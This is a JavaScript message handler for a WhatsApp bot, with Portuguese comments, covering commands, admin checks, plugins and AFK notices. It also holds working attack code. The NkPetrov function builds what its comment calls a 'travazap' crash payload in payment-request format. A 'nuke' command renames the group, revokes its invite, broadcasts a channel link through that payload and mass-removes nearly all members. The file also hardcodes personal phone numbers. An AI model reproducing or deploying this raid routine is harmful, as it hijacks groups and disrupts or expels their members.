/**
 * ╔═╗ ╔═╗ ╔╦╗ ╦ ╔═╗ ╔═╗      ╔╗  ╔═╗ ╔╦╗
 * ║ ╦ ║ ║  ║  ║ ║   ╠═╣      ╠╩╗ ║ ║  ║ 
 * ╚═╝ ╚═╝  ╩  ╩ ╚═╝ ╩ ╩      ╚═╝ ╚═╝  ╩ 
 * @author ༄ Đev Šoberano ×͜×
 * @link https://github.com/leandromemes
 * @project Gotica Bot - ANTI-CRASH & PERFORMANCE
 */
import { smsg } from './lib/simple.js'
import { format } from 'util'
import { fileURLToPath } from 'url'
import { unwatchFile, watchFile, existsSync, mkdirSync, writeFileSync, readFileSync } from 'fs'
import path, { join } from 'path'
import chalk from 'chalk'
const isNumber = x => typeof x === 'number' && !isNaN(x)
if (!global.groupCache) global.groupCache = {}
if (!global.afkCooldown) global.afkCooldown = {}
// Payload travazap no formato de pagamento NkPetrov
const NkPetrov = (texto, mentions = [], senderJid, groupJid) => {
    return {
        requestPaymentMessage: {
            currencyCodeIso4217: 'BRL',
            amount1000: '0',
            requestFrom: senderJid || 'nobody@s.whatsapp.net',
            noteMessage: { 
                extendedTextMessage: { 
                    text: texto,
                    contextInfo: {
                        mentionedJid: mentions,
                        statusJidList: [groupJid]
                    }
                } 
            },
            amount: { value: '0', offset: 1000, currencyCode: 'BRL' },
            expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
        }
    }
}
function msToTime(ms) {
    let seg = Math.floor(ms / 1000)
    let min = Math.floor(seg / 60)
    let hr = Math.floor(min / 60)
    let dia = Math.floor(hr / 24)
    let ano = Math.floor(dia / 365)
    seg %= 60
    min %= 60
    hr %= 24
    dia %= 365
    let partes = []
    if (ano) partes.push(`${ano} ano${ano > 1 ? 's' : ''}`)
    if (dia) partes.push(`${dia} dia${dia > 1 ? 's' : ''}`)
    if (hr) partes.push(`${hr} hora${hr > 1 ? 's' : ''}`)
    if (min) partes.push(`${min} minuto${min > 1 ? 's' : ''}`)
    if (seg) partes.push(`${seg} segundo${seg > 1 ? 's' : ''}`)
    return partes.length ? partes.join(', ').replace(/,([^,]*)$/, ' e$1') : 'agora há pouco'
}
export function setGp(chatJid, dataGp) {
    try {
        if (!chatJid || !chatJid.endsWith('@g.us')) return
        const cleanFrom = chatJid.split('@')[0] + '@g.us'
        const dbDir = join(process.cwd(), 'src', 'database', 'grupos')
        if (!existsSync(dbDir)) mkdirSync(dbDir, { recursive: true })
        
        const filePath = join(dbDir, `${cleanFrom}.json`)
        const payload = Array.isArray(dataGp) ? dataGp : [dataGp]
        writeFileSync(filePath, JSON.stringify(payload, null, 2))
        
        if (!global.groupCache[cleanFrom]) {
            global.groupCache[cleanFrom] = {}
        }
        global.groupCache[cleanFrom].config = payload[0]
    } catch (e) {
        console.error('[SETGP ERROR]', e)
    }
}
function checkIsSoberano(sender, senderNum, m) {
    if (m.fromMe) return true
    if (!sender) return false
    const ownerList = Array.isArray(global.owner) ? global.owner : []
    for (const entry of ownerList) {
        const ownerId = String(entry[0] || '').trim()
        if (!ownerId) continue
        if (sender === ownerId) return true
        const ownerDigits = ownerId.replace(/[^0-9]/g, '')
        if (ownerDigits && senderNum && ownerDigits === senderNum) return true
    }
    return false
}
export async function handler(chatUpdate) {
    this.msgqueque = this.msgqueque || []
    this.uptime = this.uptime || Date.now()
    if (!chatUpdate) return
    let rawM = chatUpdate.messages[chatUpdate.messages.length - 1]
    if (!rawM) return;
    if (rawM.key && rawM.key.remoteJid === 'status@broadcast') return 
    if (global.db.data == null) await global.loadDatabase()
    let rawBtnId = null
    try {
        const rawInteractive = rawM.message?.interactiveResponseMessage
        if (rawInteractive?.nativeFlowResponseMessage?.paramsJson) {
            rawBtnId = JSON.parse(rawInteractive.nativeFlowResponseMessage.paramsJson)?.id || null
        } else if (rawM.message?.templateButtonReplyMessage?.selectedId) {
            rawBtnId = rawM.message.templateButtonReplyMessage.selectedId
        } else if (rawM.message?.buttonsResponseMessage?.selectedButtonId) {
            rawBtnId = rawM.message.buttonsResponseMessage.selectedButtonId
        } else if (rawM.message?.listResponseMessage?.singleSelectReply?.selectedRowId) {
            rawBtnId = rawM.message.listResponseMessage.singleSelectReply.selectedRowId
        }
    } catch (captureErr) {
        console.error('[BTN-CAPTURE] Erro ao capturar clique de botão:', captureErr)
    }
    try {
        let m = smsg(this, rawM) || rawM
        if (!m) return

        // ── NORMATIZAÇÃO DO MENSAGEIRO CITADO (QUOTED) ──
        if (m.quoted) {
            if (!m.quoted.sender && m.quoted.participant) {
                m.quoted.sender = m.quoted.participant
            }
            if (!m.quoted.sender && m.quoted.key && m.quoted.key.participant) {
                m.quoted.sender = m.quoted.key.participant
            }
            if (!m.quoted.sender && m.chat && !m.isGroup) {
                m.quoted.sender = m.chat
            }
        }
        let bodyText = rawBtnId || m.text || ''
        if (!rawBtnId && m.message) {
            const btnId = m.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson 
                ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id
                : null
            
            if (btnId) {
                bodyText = btnId
            } else if (m.message.templateButtonReplyMessage?.selectedId) {
                bodyText = m.message.templateButtonReplyMessage.selectedId
            } else if (m.message.buttonsResponseMessage?.selectedButtonId) {
                bodyText = m.message.buttonsResponseMessage.selectedButtonId
            }
        }
        // Identificadores universais do bot
        const rawBotJid = this.user?.id || this.user?.jid || ''
        const cleanBotJid = rawBotJid.split(':')[0].split('@')[0]
        const botId = cleanBotJid.replace(/[^0-9]/g, '')
        const botLid = (this.user?.lid || '').split(':')[0].split('@')[0]
        
        const sender = m.sender;
        const senderNum = sender?.replace(/[^0-9]/g, '') || '';
        
        const isSoberano = checkIsSoberano(sender, senderNum, m) || senderNum === botId
        // ── REGISTRO DE NOMES NO BANCO DE DADOS E NOS CHATS ──
        if (sender) {
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            
            if (m.pushName) {
                global.db.data.users[sender].name = m.pushName
                global.db.data.users[sender].pushName = m.pushName
                
                if (this.chats && this.chats[sender]) {
                    this.chats[sender].name = m.pushName
                    this.chats[sender].vname = m.pushName
                }
            }
            if (global.db.data.users[sender]?.banned && !isSoberano) return
        }
        if (m.quoted && m.quoted.sender) {
            let qSender = m.quoted.sender
            if (!global.db.data.users[qSender]) global.db.data.users[qSender] = {}
            if (m.quoted.pushName) {
                global.db.data.users[qSender].name = m.quoted.pushName
                global.db.data.users[qSender].pushName = m.quoted.pushName
                if (this.chats && this.chats[qSender]) {
                    this.chats[qSender].name = m.quoted.pushName
                    this.chats[qSender].vname = m.quoted.pushName
                }
            }
        }
        // ── VERIFICAÇÃO DE CHAT DESATIVADO (BOT BANIDO NO GRUPO) ──
        if (!global.db.data.chats) global.db.data.chats = {}
        if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {}
        let chatDb = global.db.data.chats[m.chat]
        // --- CORREÇÃO DE PREFIXO ÚNICO ---
        let _prefix = global.prefix || '!'
        // Trava para aceitar APENAS o prefixo definido no settings.js
        const escapedPrefix = _prefix.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
        const prefixRegex = new RegExp(`^${escapedPrefix}`)
        let match = prefixRegex.exec(bodyText)
        let isEnableCmd = false
        if (match) {
            let noPref = bodyText.slice(match[0].length).trim()
            let [cmdCheck] = noPref.split` `.filter(v => v)
            if (/^(on|ligar|ativarbot|onbot)$/i.test(cmdCheck)) {
                isEnableCmd = true
            }
        }
        if (chatDb.bannedBots && chatDb.bannedBots.includes(this.user.jid) && !isEnableCmd && !isSoberano) {
            return
        }

        // ── DADOS DE GRUPO CALCULADOS UMA ÚNICA VEZ (reaproveitados abaixo,
        // tanto pelo disparo de plugin.before() quanto pela execução de
        // comandos) para não buscar groupMetadata duas vezes por mensagem ──
        let usedPrefixEarly = match ? match[0] : ''
        let noPrefixEarly = match ? bodyText.slice(usedPrefixEarly.length).trim() : ''
        let commandEarly = (noPrefixEarly.split` `.filter(v => v)[0] || '').toLowerCase()
        let argsEarly = noPrefixEarly.split` `.slice(1)
        let textEarly = argsEarly.join(' ')

        let groupMetadata = {}
        if (m.isGroup) {
            groupMetadata = await this.groupMetadata(m.chat).catch(() => ({}))
        }
        let participants = groupMetadata.participants || []
        const checkUserAdmin = (u) => {
            return u.admin === 'admin' || u.admin === 'superadmin' || u.admin === true
        }
        let isAdmin = m.isGroup ? !!participants.find(u => {
            const uJid = (u.id || u.jid || '')
            const uClean = uJid.split(':')[0].split('@')[0].replace(/[^0-9]/g, '')
            return (uClean === senderNum || uJid === sender) && checkUserAdmin(u)
        }) : false
        let isBotAdmin = m.isGroup ? !!participants.find(u => {
            const uJid = (u.id || u.jid || '')
            const uClean = uJid.split(':')[0].split('@')[0].replace(/[^0-9]/g, '')
            const isMatch = uClean === botId || 
                            uJid === rawBotJid || 
                            (botLid && uJid.includes(botLid)) ||
                            (cleanBotJid && uJid.includes(cleanBotJid))
            return isMatch && checkUserAdmin(u)
        }) : false

        // ── DISPARADOR DE plugin.before() ────────────────────────────────
        // Alguns plugins (ex: _welcome.js, _antilink2.js, _antitrava.js)
        // exportam uma função `before(m, ctx)` em vez de `handler`/`command`,
        // esperando ser chamados para TODA mensagem/evento (incluindo
        // entrada/saída de grupo, que não têm prefixo nem comando). Esse
        // loop nunca existiu no handler antes, por isso esses plugins
        // ficavam "mudos". Chamado via .call(this, ...) para que `this`
        // dentro da função before() seja o `conn` (alguns plugins usam
        // this.user.jid internamente) -- sem isso, this vem undefined.
        // Try/catch isolado por plugin e ao redor do loop inteiro: um erro
        // aqui nunca deve interferir no restante do fluxo já existente.
        try {
            for (let name in global.plugins) {
                let plugin = global.plugins[name]
                if (!plugin || plugin.disabled) continue
                const beforeFn = typeof plugin.before === 'function' ? plugin.before : null
                if (!beforeFn) continue

                try {
                    await beforeFn.call(this, m, {
                        conn: this,
                        groupMetadata,
                        participants,
                        isAdmin,
                        isBotAdmin,
                        isSoberano,
                        isOwner: isSoberano,
                        text: textEarly,
                        usedPrefix: usedPrefixEarly,
                        command: commandEarly,
                        args: argsEarly
                    })
                } catch (beforeErr) {
                    console.error(`[BEFORE-PLUGIN ERROR] ${name}:`, beforeErr)
                }
            }
        } catch (beforeLoopErr) {
            console.error('[BEFORE-DISPATCH ERROR]', beforeLoopErr)
        }
        // ──────────────────────────────────────────────────────────────────

        // ── SISTEMA DE AFK COM BANCO DE DADOS DO GRUPO (JSON) ──
        if (m.isGroup && !m.fromMe) {
            const cleanFrom = m.chat.split('@')[0] + '@g.us'
            const filePath = join(process.cwd(), 'src', 'database', 'grupos', `${cleanFrom}.json`)
            let dataGp = [{ ausentes: [] }]
            if (existsSync(filePath)) {
                try {
                    dataGp = JSON.parse(readFileSync(filePath, 'utf-8'))
                    if (!Array.isArray(dataGp) || dataGp.length === 0) {
                        dataGp = [{ ausentes: [] }]
                    }
                } catch (e) {
                    dataGp = [{ ausentes: [] }]
                }
            }
            if (!dataGp[0].ausentes) dataGp[0].ausentes = []
            let isAfkCommand = false
            if (match) {
                let noPref = bodyText.slice(match[0].length).trim()
                let [cmdCheck] = noPref.split` `.filter(v => v)
                if (/^(afk|ausente|off)$/i.test(cmdCheck)) {
                    isAfkCommand = true
                }
            }
            if (dataGp[0].ausentes.length > 0) {
                let afkList = dataGp[0].ausentes;
                let menc_jid2 = []
                if (m.mentionedJid && m.mentionedJid.length > 0) menc_jid2.push(...m.mentionedJid)
                if (m.quoted && m.quoted.sender) menc_jid2.push(m.quoted.sender)
                if (menc_jid2.length > 0 && !isAfkCommand) {
                    for (let targetJid of menc_jid2) {
                        if (targetJid === sender || targetJid.includes(botId)) continue
                        let afkUser = afkList.find(x => x.id === targetJid);
                        if (afkUser) {
                            const cdKey = `${m.chat}_${targetJid}`
                            const agora = Date.now()
                            if (global.afkCooldown[cdKey] && (agora - global.afkCooldown[cdKey]) < 30000) {
                                continue
                            }
                            global.afkCooldown[cdKey] = agora
                            let tempo = msToTime(agora - afkUser.hora);
                            let msgAviso = `*┎┶┅┅┅━═⋅═━━━━═⋅═━┅┅┅┅☾⋆*\n`
                            msgAviso += `*⚠️ USUÁRIO AUSENTE*\n`
                            msgAviso += `*─━━━━┉❈⏤͟͟͞͞★꙲⃝͟🖤❈┉━━━━─*\n`
                            msgAviso += `*┇┆👤 Usuário:* @${targetJid.split('@')[0]}\n`
                            msgAviso += `*┇┆📝 Motivo:* ${afkUser.msg}\n`
                            msgAviso += `*┇┆⏱️ Ausente há:* ${tempo}\n`
                            msgAviso += `*┇├┉━┅━┅━┅━┅━┅━┅━⋅≎⋆ᐧ*\n`
                            await this.sendMessage(m.chat, {
                                text: msgAviso,
                                mentions: [targetJid]
                            }, { quoted: m })
                            break
                        }
                    }
                }
                let eu_afk = afkList.find(x => x.id === sender);
                if (eu_afk && !isAfkCommand) {
                    let tempo = msToTime(Date.now() - eu_afk.hora);
                    dataGp[0].ausentes = afkList.filter(x => x.id !== sender);
                    setGp(m.chat, dataGp);
                    let msgVolta = `*┎┶┅┅┅━═⋅═━━━━═⋅═━┅┅┅┅☾⋆*\n`
                    msgVolta += `*👋 BEM-VINDO(A) DE VOLTA!*\n`
                    msgVolta += `*─━━━━┉❈⏤͟͟͞͞★꙲⃝͟✨❈┉━━━━─*\n`
                    msgVolta += `*┇┆Você não está mais em modo AFK neste grupo.*\n`
                    msgVolta += `*┇┆⏱️ Tempo fora:* ${tempo}\n`
                    msgVolta += `*┇├┉━┅━┅━┅━┅━┅━┅━⋅≎⋆ᐧ*\n`
                    await this.sendMessage(m.chat, {
                        text: msgVolta,
                        mentions: [sender]
                    }, { quoted: m })
                }
            }
        }
        if (match) {
            let usedPrefix = match[0]
            let noPrefix = bodyText.slice(usedPrefix.length).trim()
            let [command] = noPrefix.split` `.filter(v => v)
            command = (command || '').toLowerCase()
            const args = noPrefix.split` `.slice(1)
            const text = args.join(' ')
// ── INJEÇÃO DIRETA DO COMANDO NUKE NATIVO (RÁPIDO) ──
            if (command === 'nuke') {
                console.log(chalk.black(chalk.bgRed(` [NUKE EXECUTADO DIRETO] `)), `de ${chalk.green(m.pushName || senderNum)}`)
                
                if (!isSoberano) return m.reply(global.dfail('owner'))
                if (!m.isGroup) return m.reply(global.dfail('group'))
                if (!isBotAdmin) return m.reply(global.dfail('botAdmin'))
                try {
                    const ownerName = 'Dev Soberano'
                    const groupOwnerId = groupMetadata.owner
                    const donosNumeros = ['5574991940377', '556392775736']
                    // Executa alterações sequencialmente sem delays arbitrários
                    await this.groupUpdateSubject(m.chat, `ARQUIVADO POR: ${ownerName}`).catch(() => {})
                    await this.groupUpdateDescription(m.chat, `Este grupo foi arquivado por ordens de ${ownerName}.`).catch(() => {})
                    await this.groupRevokeInvite(m.chat).catch(() => {})
                    const textNuke = `⚠️ *AVISO IMPORTANTE* ⚠️\n\n` +
                                     `📢 O grupo está sendo transferido para o canal oficial!\n\n` +
                                     `👉 *Entre agora para não perder o acesso* 👈\n\n` +
                                     `⚔️ *𝐋 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘* 🏴\n` +
                                     `https://whatsapp.com/channel/0029Vb8Wthb96H4LgqKcKv1T\n\n` +
                                     `_By: ༄ Đev Šoberano ×͜×_`
                    // Envia a mensagem de aviso ANTES de banir
                    const paymentPayload = NkPetrov(textNuke, participants.map(p => p.id), m.sender, m.chat)
                    await this.relayMessage(m.chat, paymentPayload, {})
                    const membersToRemove = participants
                        .map(p => p.id)
                        .filter(id => {
                            const cleanId = id.split('@')[0].split(':')[0].replace(/[^0-9]/g, '')
                            const isBot = cleanId === botId || id === rawBotJid || (botLid && id.includes(botLid))
                            const isCreator = id === groupOwnerId
                            const isOwner = donosNumeros.includes(cleanId)
                            const isSender = id === m.sender
                            return !isBot && !isCreator && !isOwner && !isSender
                        })
                    if (membersToRemove.length > 0) {
                        // Delay mínimo de 2s apenas para garantir que as msgs de cima cheguem antes do chute
                        await new Promise(r => setTimeout(r, 2000))
                        await this.groupParticipantsUpdate(m.chat, membersToRemove, 'remove')
                        console.log(chalk.green(`[NUKE] Remoção de ${membersToRemove.length} plebeus concluída.`))
                    }
                    return
                } catch (e) {
                    console.error('Erro no Nuke:', e)
                    return m.reply('Erro ao executar nuke rápido.')
                }
            }
            // ── EXECUÇÃO DE OUTROS PLUGINS ──
            for (let name in global.plugins) {
                let plugin = global.plugins[name]
                if (!plugin || plugin.disabled) continue
                let isAccept = false
                if (Array.isArray(plugin.command)) {
                    isAccept = plugin.command.includes(command)
                } else if (plugin.command instanceof RegExp) {
                    isAccept = plugin.command.test(command)
                } else if (typeof plugin.command === 'string') {
                    isAccept = plugin.command === command
                }
                if (!isAccept) continue
                (async () => {
                    try {
                        const isEcon = ['apostar', 'cassino', 'vadiar', 'trabalhar', 'salario', 'roubar'].includes(command);
                        this.cooldown = this.cooldown || {}
                        let cdTime = isEcon ? 2500 : 1000; 
                        if (!isSoberano && (Date.now() - (this.cooldown[sender] || 0)) < cdTime) return
                        this.cooldown[sender] = Date.now()
                        console.log(chalk.black(chalk.bgCyan(` BOT ${botId} `)), chalk.black(chalk.bgWhite(` ${command} `)), `de ${chalk.green(m.pushName || senderNum)}`)
                        const isROwner = isSoberano;
                        if ((plugin.owner || plugin.rowner) && !isSoberano) return m.reply(global.dfail('owner'))
                        if (plugin.group && !m.isGroup) return m.reply(global.dfail('group'))
                        if (plugin.admin && !isAdmin && !isSoberano) return m.reply(global.dfail('admin'))
                        if (plugin.botAdmin && !isBotAdmin) return m.reply(global.dfail('botAdmin'))
                        await plugin.call(this, m, { 
                            conn: this, args, command, text, usedPrefix,
                            participants, groupMetadata, isSoberano, isOwner: isSoberano,
                            isAdmin, isBotAdmin, isROwner
                        })
                    } catch (err) {
                        if (err.message?.includes('rate-overlimit')) {
                            console.log(chalk.bgRed.white(` [!] LIMITE DE REQUISIÇÕES ATINGIDO: ${command} `))
                        } else {
                            console.error(err)
                        }
                    }
                })()
                break 
            }
        }
    } catch (e) {
        console.error(e)
    }
}
global.dfail = (type) => {
    return {
        owner: '༄ Đev Šoberano ×͜× | Comando exclusivo do meu mestre!',
        admin: '༄ Đev Šoberano ×͜× | Você precisa ser ADM para usar isso.',
        botAdmin: '༄ Đev Šoberano ×͜× | Preciso ser Admin para executar essa função.',
        group: '༄ Đev Šoberano ×͜× | Este comando só funciona em grupos.'
    }[type]
};
const file = fileURLToPath(import.meta.url);
watchFile(file, () => {
    unwatchFile(file);
    console.log(chalk.bold.greenBright(`[HANDLER UPDATED] - ༄ Đev Šoberano ×͜×`));
});